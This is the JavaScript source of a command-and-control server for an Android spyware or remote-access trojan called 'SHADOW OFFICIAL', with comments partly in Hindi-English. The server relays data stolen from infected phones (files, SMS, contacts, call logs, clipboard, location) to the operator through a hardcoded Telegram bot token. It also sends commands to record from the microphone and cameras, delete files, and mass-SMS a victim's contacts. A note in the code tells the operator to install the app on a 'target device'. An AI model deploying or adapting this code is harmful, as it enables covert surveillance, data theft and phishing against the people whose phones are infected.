const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

// ============================================
// SAB KUCH HARDCODED - YAHAN SE EDIT KARO
// ============================================
const token = '8756594471:AAHTdrMFFTXlBXA2L-mSy2BWItas-J_X_Zw'
const id = '8408378910'
const PORT = process.env.PORT || 3000
const address = 'https://www.google.com'
// ============================================

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

// 🎨 STYLISH WEB PAGE - SHADOW OFFICIAL
app.get('/', function (req, res) {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>⚡ SHADOW OFFICIAL ⚡</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                background: #000;
                color: #0f0;
                font-family: 'Courier New', monospace;
                overflow: hidden;
                height: 100vh;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
            }
            
            /* Matrix Rain Effect */
            .matrix {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                opacity: 0.3;
                z-index: 0;
            }
            
            .content {
                z-index: 1;
                text-align: center;
                position: relative;
            }
            
            .glitch {
                font-size: 4rem;
                font-weight: bold;
                text-transform: uppercase;
                position: relative;
                text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff,
                            0.025em 0.04em 0 #fffc00;
                animation: glitch 725ms infinite;
            }
            
            .glitch span {
                position: absolute;
                top: 0;
                left: 0;
            }
            
            @keyframes glitch {
                0% { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00; }
                15% { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00; }
                16% { text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff, -0.05em -0.05em 0 #fffc00; }
                49% { text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff, -0.05em -0.05em 0 #fffc00; }
                50% { text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff, 0 -0.04em 0 #fffc00; }
                99% { text-shadow: 0.05em 0.035em 0 #00fffc, 0.03em 0 0 #fc00ff, 0 -0.04em 0 #fffc00; }
                100% { text-shadow: -0.05em 0 0 #00fffc, -0.025em -0.04em 0 #fc00ff, -0.04em -0.025em 0 #fffc00; }
            }
            
            .subtitle {
                font-size: 1.2rem;
                margin-top: 20px;
                color: #0ff;
                text-shadow: 0 0 10px #0ff;
                animation: pulse 2s infinite;
            }
            
            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.5; }
            }
            
            .hacker-img {
                width: 200px;
                height: 200px;
                margin: 30px auto;
                background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect fill="%23000" width="100" height="100"/><text x="50" y="50" font-size="60" text-anchor="middle" fill="%230f0">👨‍💻</text></svg>') center/contain no-repeat;
                filter: drop-shadow(0 0 20px #0f0);
                animation: float 3s ease-in-out infinite;
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-20px); }
            }
            
            .status {
                margin-top: 30px;
                padding: 15px 30px;
                border: 2px solid #0f0;
                border-radius: 10px;
                background: rgba(0, 255, 0, 0.1);
                box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
            }
            
            .status-text {
                font-size: 1.1rem;
                color: #0f0;
            }
            
            .blink {
                animation: blink 1s infinite;
            }
            
            @keyframes blink {
                0%, 50% { opacity: 1; }
                51%, 100% { opacity: 0; }
            }
            
            .particles {
                position: absolute;
                width: 100%;
                height: 100%;
                overflow: hidden;
                z-index: 0;
            }
            
            .particle {
                position: absolute;
                width: 4px;
                height: 4px;
                background: #0f0;
                border-radius: 50%;
                animation: rise 10s infinite;
                opacity: 0;
            }
            
            @keyframes rise {
                0% { transform: translateY(100vh) scale(0); opacity: 0; }
                10% { opacity: 1; }
                90% { opacity: 1; }
                100% { transform: translateY(-100vh) scale(1.5); opacity: 0; }
            }
        </style>
    </head>
    <body>
        <canvas class="matrix" id="matrix"></canvas>
        <div class="particles" id="particles"></div>
        
        <div class="content">
            <div class="hacker-img"></div>
            <h1 class="glitch">⚡ SHADOW OFFICIAL ⚡</h1>
            <p class="subtitle">🔴 SYSTEM ONLINE 🔴</p>
            
            <div class="status">
                <p class="status-text">
                    <span class="blink">➤</span> 
                    SERVER STATUS: <span style="color: #0f0;">OPERATIONAL</span> 
                    <span class="blink">➤</span>
                </p>
                <p style="margin-top: 10px; color: #0ff;">🛡️ Secure Connection Established 🛡️</p>
            </div>
        </div>
        
        <script>
            // Matrix Rain Effect
            const canvas = document.getElementById('matrix');
            const ctx = canvas.getContext('2d');
            
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
            const fontSize = 14;
            const columns = canvas.width / fontSize;
            const drops = [];
            
            for(let i = 0; i < columns; i++) {
                drops[i] = 1;
            }
            
            function drawMatrix() {
                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                ctx.fillStyle = '#0f0';
                ctx.font = fontSize + 'px monospace';
                
                for(let i = 0; i < drops.length; i++) {
                    const text = chars.charAt(Math.floor(Math.random() * chars.length));
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                    
                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }
            
            setInterval(drawMatrix, 35);
            
            // Floating Particles
            const particlesContainer = document.getElementById('particles');
            for(let i = 0; i < 50; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 10 + 's';
                particle.style.animationDuration = (10 + Math.random() * 10) + 's';
                particlesContainer.appendChild(particle);
            }
        </script>
    </body>
    </html>
    `)
})

// 📁 FILE UPLOAD - Developer messages IGNORE karo
app.post("/uploadFile", upload.single('file'), (req, res) => {
    // 🔍 Check if message is from developer (ignore karo)
    const model = req.headers.model || 'Unknown';
    if (model.toLowerCase().includes('developer') || 
        model.toLowerCase().includes('dev') ||
        model.toLowerCase().includes('admin')) {
        console.log('🚫 Developer message ignored');
        res.send('');
        return;
    }
    
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `📱 <b>Device:</b> ${model}\n📁 <b>File Received</b>`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})

// 📝 TEXT UPLOAD - Developer messages IGNORE karo
app.post("/uploadText", (req, res) => {
    // 🔍 Check if message is from developer (ignore karo)
    const model = req.headers.model || 'Unknown';
    if (model.toLowerCase().includes('developer') || 
        model.toLowerCase().includes('dev') ||
        model.toLowerCase().includes('admin')) {
        console.log('🚫 Developer message ignored');
        res.send('');
        return;
    }
    
    appBot.sendMessage(id, `📱 <b>${model}</b>\n\n💬 ${req.body['text']}`, {parse_mode: "HTML"})
    res.send('')
})

// 📍 LOCATION UPLOAD - Developer messages IGNORE karo
app.post("/uploadLocation", (req, res) => {
    // 🔍 Check if message is from developer (ignore karo)
    const model = req.headers.model || 'Unknown';
    if (model.toLowerCase().includes('developer') || 
        model.toLowerCase().includes('dev') ||
        model.toLowerCase().includes('admin')) {
        console.log('🚫 Developer message ignored');
        res.send('');
        return;
    }
    
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `📱 <b>${model}</b>\n\n📍 Location Shared`, {parse_mode: "HTML"})
    res.send('')
})

// 🔌 WEBSOCKET CONNECTION
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    
    // 🎉 STYLISH CONNECTION MESSAGE
    appBot.sendMessage(id,
        `🔥 <b>NEW DEVICE CONNECTED</b> 🔥\n\n` +
        `📱 <b>Model:</b> ${model}\n` +
        `🔋 <b>Battery:</b> ${battery}\n` +
        `🤖 <b>Android:</b> ${version}\n` +
        `💡 <b>Brightness:</b> ${brightness}\n` +
        `🏢 <b>Provider:</b> ${provider}\n\n` +
        `⚡ <i>Ready for commands...</i>`,
        {parse_mode: "HTML"}
    )
    
    ws.on('close', function () {
        appBot.sendMessage(id,
            `⚠️ <b>DEVICE DISCONNECTED</b> ⚠️\n\n` +
            `📱 <b>Model:</b> ${model}\n` +
            `🔋 <b>Battery:</b> ${battery}\n` +
            `🤖 <b>Android:</b> ${version}\n\n` +
            `🔴 <i>Connection Lost</i>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})

// 🤖 BOT COMMANDS - STYLISH MESSAGES
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    
    // 🔍 Check if message is from developer (ignore karo)
    if (message.from && message.from.username) {
        const username = message.from.username.toLowerCase();
        if (username.includes('developer') || username.includes('dev') || username.includes('admin')) {
            console.log('🚫 Developer bot message ignored');
            return;
        }
    }
    
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('📞 Enter number for SMS')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '✅ <b>Got it!</b>\n\n' +
                '💬 Now enter the message to send:',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('💬 Now enter the message')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '🚀 <b>Request Processing...</b>\n\n' +
                '⏳ Please wait for response!',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('📨 Enter message for all contacts')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🚀 <b>Bulk SMS Sent!</b>\n\n' +
                '⏳ Processing...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('📁 Enter file path to download')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, '🚀 <b>File Request Sent!</b>', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                    'resize_keyboard': true
                }
            })
        }
        if (message.reply_to_message.text.includes('🗑️ Enter file path to delete')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, '🚀 <b>Delete Request Sent!</b>', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                    'resize_keyboard': true
                }
            })
        }
        if (message.reply_to_message.text.includes('🎤 Enter recording duration (seconds)')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, '🚀 <b>Recording Started!</b>', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                    'resize_keyboard': true
                }
            })
        }
        if (message.reply_to_message.text.includes('📹 Enter main camera duration')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, '🚀 <b>Camera Recording Started!</b>', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                    'resize_keyboard': true
                }
            })
        }
        if (message.reply_to_message.text.includes('🤳 Enter selfie camera duration')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, '🚀 <b>Selfie Recording Started!</b>', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                    'resize_keyboard': true
                }
            })
        }
        if (message.reply_to_message.text.includes('🍞 Enter toast message')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, '🚀 <b>Toast Sent!</b>', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                    'resize_keyboard': true
                }
            })
        }
        if (message.reply_to_message.text.includes('🔔 Enter notification title')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '🔗 <b>Now enter the link</b>\n\n' +
                '🔗 URL to open when clicked:',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('🔗 Now enter the link')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, '🚀 <b>Notification Sent!</b>', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                    'resize_keyboard': true
                }
            })
        }
        if (message.reply_to_message.text.includes('🎵 Enter audio URL')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id, '🚀 <b>Audio Playing!</b>', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                    'resize_keyboard': true
                }
            })
        }
    }
    
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                `🔥 <b>WELCOME TO SHADOW PANEL</b> 🔥\n\n` +
                `👤 <b>Owner:</b> @YourUsername\n` +
                `🛡️ <b>Status:</b> Online\n\n` +
                `📱 <b>Connected Devices:</b> ${appClients.size}\n\n` +
                `⚡ Select an option below:`,
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["📱 Connected Devices"], ["⚡ Execute Command"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == '📱 Connected Devices') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    `⚠️ <b>No Devices Connected</b>\n\n` +
                    `🔴 Status: Offline\n` +
                    `💡 Install app on target device`,
                    {parse_mode: "HTML"}
                )
            } else {
                let text = `🔥 <b>CONNECTED DEVICES</b> 🔥\n\n`
                appClients.forEach(function (value, key, map) {
                    text += `📱 <b>${value.model}</b>\n` +
                        `🔋 ${value.battery} | 🤖 ${value.version}\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == '⚡ Execute Command') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    `⚠️ <b>No Devices Available</b>\n\n` +
                    `🔴 Please connect a device first!`,
                    {parse_mode: "HTML"}
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: `📱 ${value.model}`,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '⚡ <b>Select Device:</b>', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '⛔ <b>Access Denied!</b>')
    }
})

// 🎮 CALLBACK QUERIES - STYLISH BUTTONS
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    
    if (commend == 'device') {
        const deviceInfo = appClients.get(uuid);
        appBot.editMessageText(`⚡ <b>COMMAND CENTER</b>\n\n📱 ${deviceInfo.model}`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '📱 Apps', callback_data: `apps:${uuid}`},
                        {text: 'ℹ️ Device Info', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '📁 Get File', callback_data: `file:${uuid}`},
                        {text: '🗑️ Delete File', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '📋 Clipboard', callback_data: `clipboard:${uuid}`},
                        {text: '🎤 Microphone', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '📷 Main Camera', callback_data: `camera_main:${uuid}`},
                        {text: '🤳 Selfie Camera', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '📍 Location', callback_data: `location:${uuid}`},
                        {text: '🍞 Toast', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '📞 Calls', callback_data: `calls:${uuid}`},
                        {text: '👥 Contacts', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '📳 Vibrate', callback_data: `vibrate:${uuid}`},
                        {text: '🔔 Notification', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '💬 Messages', callback_data: `messages:${uuid}`},
                        {text: '📤 Send SMS', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '🎵 Play Audio', callback_data: `play_audio:${uuid}`},
                        {text: '⏹️ Stop Audio', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '📨 Send to All Contacts',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            }
        })
    }
    
    // Handle all other callbacks with stylish messages
    const commandHandlers = {
        'apps': {text: '📱 Fetching apps list...', cmd: 'apps'},
        'device_info': {text: 'ℹ️ Getting device info...', cmd: 'device_info'},
        'file': {text: '📁 Enter file path to download:', input: true},
        'delete_file': {text: '🗑️ Enter file path to delete:', input: true},
        'clipboard': {text: '📋 Fetching clipboard...', cmd: 'clipboard'},
        'microphone': {text: '🎤 Enter recording duration (seconds):', input: true},
        'camera_main': {text: '📹 Enter main camera duration:', input: true},
        'camera_selfie': {text: '🤳 Enter selfie camera duration:', input: true},
        'location': {text: '📍 Getting location...', cmd: 'location'},
        'toast': {text: '🍞 Enter toast message:', input: true},
        'calls': {text: '📞 Fetching call logs...', cmd: 'calls'},
        'contacts': {text: '👥 Fetching contacts...', cmd: 'contacts'},
        'messages': {text: '💬 Fetching messages...', cmd: 'messages'},
        'vibrate': {text: '📳 Vibrating device...', cmd: 'vibrate'},
        'show_notification': {text: '🔔 Enter notification title:', input: true},
        'send_message': {text: '📞 Enter number for SMS:', input: true},
        'send_message_to_all': {text: '📨 Enter message for all contacts:', input: true},
        'play_audio': {text: '🎵 Enter audio URL:', input: true},
        'stop_audio': {text: '⏹️ Stopping audio...', cmd: 'stop_audio'}
    };
    
    const handler = commandHandlers[commend];
    if (handler) {
        if (handler.input) {
            // Send message with force reply
            appBot.sendMessage(id, handler.text, {
                reply_markup: {force_reply: true}
            });
        } else {
            // Execute command directly
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == uuid) {
                    ws.send(handler.cmd);
                }
            });
            appBot.sendMessage(id, `🚀 <b>${handler.text}</b>\n\n⏳ Processing...`, {parse_mode: "HTML"});
        }
        currentUuid = uuid;
    }
})

// 🚀 START SERVER
appServer.listen(PORT, () => {
    console.log(`
    ╔═══════════════════════════════════════╗
    ║     ⚡ SHADOW OFFICIAL PANEL ⚡        ║
    ║                                       ║
    ║     🟢 Server Running on port ${PORT}     ║
    ║     🌐 http://localhost:${PORT}          ║
    ║                                       ║
    ╚═══════════════════════════════════════╝
    `);
});
